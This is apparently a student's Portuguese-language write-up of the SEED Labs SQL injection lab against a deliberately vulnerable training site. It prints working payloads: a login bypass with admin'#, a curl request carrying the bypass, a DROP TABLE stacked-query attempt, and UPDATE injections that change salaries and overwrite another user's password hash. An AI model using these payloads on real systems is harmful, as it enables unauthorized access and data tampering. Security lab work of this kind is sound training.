# Semana 8

## SEED Labs - SQL Injection Lab

### Task 1

Na primeira tarefa, fomos encarregados de apresentar todas as informações para o usuário "Alice". Para alcançar esse objetivo, acessamos o contêiner MySQL utilizando o comando ```docksh c7```. Em seguida, executamos os comandos ```mysql -u root -pdees``` para entrar no MySQL como superusuário e ```sqllab_users``` de forma a selecionar o schema.

Ao analisar o conteúdo do arquivo ```sqllab_users.sql```, identificamos o comando correto para extrair as informações desejadas:

    SELECT * FROM `credential` WHERE Name = "Alice";

Assim obtivemos os dados da Alice:

![image](assets/s8i1.png)

### Task 2

#### Task 2.1

Ao examinar o site fornecido pelo Docker e o arquivo unsafe_home.php, notamos que a consulta apresenta uma vulnerabilidade. Isso ocorre porque o servidor gera dinamicamente o comando SQL usando strings não sanitizadas provenientes da entrada do usuário. Essa prática torna a aplicação suscetível a ataques de injeção de SQL:

    SELECT id, name, eid, salary, birth, ssn, phoneNumber, address, email, nickname, Password FROM credential WHERE name='$input_uname' and Password='$hashed_pwd'

Aproveitando o fato de que o campo de senha é criptografado, é possível explorar a funcionalidade de pesquisa manipulando apenas o campo de nome de usuário. Ao inserir 'admin'# como entrada, garantimos acesso privilegiado, pois a verificação da chave de acesso se torna irrelevante ao ser comentada. Com isso, o código executado no lado do servidor é modificado da seguinte maneira:

    SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password FROM credential WHERE name='admin'# and Password=’$hashed_pwd’

Portanto, conforme planejado, conseguimos efetuar login com a conta de administrador, abrindo a possibilidade de obter todos os dados dos usuários no aplicativo:

![image](assets/s8i2.png)

#### Task 2.2

Nesta tarefa, executei um ataque por meio de uma solicitação GET. Para obter todo o código HTML da página, incluindo todas as informações dos usuários, utilizei o seguinte comando malicioso:

    curl "http://www.seed-server.com/unsafe_home.php?username=admin%27%23&Password="

Como esperado o resultado foi o seguinte:

![image](assets/s8i3.png)

![image](assets/s8i4.png)

#### Task 2.3

Através do SQL, é possível utilizar ```;``` para inserir novos comandos. Ao empregar essa funcionalidade, busquei causar um efeito colateral no servidor. O comando utilizado foi o seguinte:

    admin'; DROP TABLE IF EXISTS admin; #

No entanto, esta operação não foi executada devido a um erro na base de dados. A extensão MySQL utilizada pelo PHP no servidor possui uma salvaguarda que impede a execução de várias consultas simultâneas, o que resultou na impossibilidade de concluir o ataque:

![image](assets/s8i5.png)

### Task 3

#### Task 3.1

Após efetuar o login com uma conta do sistema (username: Alice e password: seedalice), obtivemos acesso a uma página destinada à edição de informações pessoais. Essa página é gerenciada pelo arquivo fornecido ```unsafe_edit_backend.php```, que contém uma consulta construída dinamicamente com strings não sanitizadas provenientes da entrada do usuário. Nosso ataque envolve a manipulação do número de telefone. Utilizando a mesma técnica dos tópicos anteriores, conseguimos criar o seguinte código capaz de manipular o salário do usuário:

    960000000' ,Salary =' 56565656

![image](assets/s8i6.png)

É crucial notar que a aspas simples (') antes do valor do salário é fundamental para concluir a última instrução antes do WHERE. Em última análise, o servidor executou o seguinte código:

    UPDATE credential SET
    nickname= '$input_nickname', 
    email='$input_email', 
    address='$input_address',
    Password='$hashed_pwd',
    PhoneNumber='960000000',Salary='56565656' WHERE ID=$id;

Como esperado o salário foi modificado como o esperado:

![image](assets/s8i7.png)

### Task 3.2

Para alterar o valor do salário de outro usuário, utilizamos uma técnica semelhante à anterior. No entanto, criamos uma cláusula WHERE diferente e comentamos a existente no sistema para evitar interferências na pesquisa:
    
    960000000' ,Salary='0' WHERE Name='Boby'#

![image](assets/s8i8.png)

Com esta entrada, o servidor executou o seguinte código:

    UPDATE credential SET
    nickname= '$input_nickname', 
    email='$input_email', 
    address= '$input_address', 
    Password='$hashed_pwd',
    PhoneNumber='960000000', Salary='0' WHERE Name= 'Boby'# WHERE ID=$id;

Aqui podemos observar o valor de salário de Boby após o ataque:

![image](assets/s8i9.png)

#### Task 3.3

Para modificar a senha de outro usuário, aplicamos uma abordagem semelhante à anterior. No entanto, desta vez, o valor a ser alterado foi previamente criptografado com SHA1. Por exemplo, para a nova senha "segurança", o hash correspondente é 5a5f1484546b0f83f9e9166d6222e2e9743c037d.

    960000000', password='5a5f1484546b0f83f9e9166d6222e2e9743c037d' WHERE name='Boby'#

![image](assets/s8i10.png)

Com esta entrada, o servidor executou o seguinte código:

    UPDATE credential SET|
    nickname='$input_nickname', 
    email='$input_email', 
    address='$input_address', 
    Password='$hashed_pwd',
    PhoneNumber='960000000', password='5a5f1484546b0f83f9e9166d6222e2e9743c037d' WHERE name='Boby'# WHERE ID=$id;

Assim, ao utilizarmos a nova senha para Boby, conseguimos entrar na conta dele:

![image](assets/s8i11.png)

## CTF - Format Strings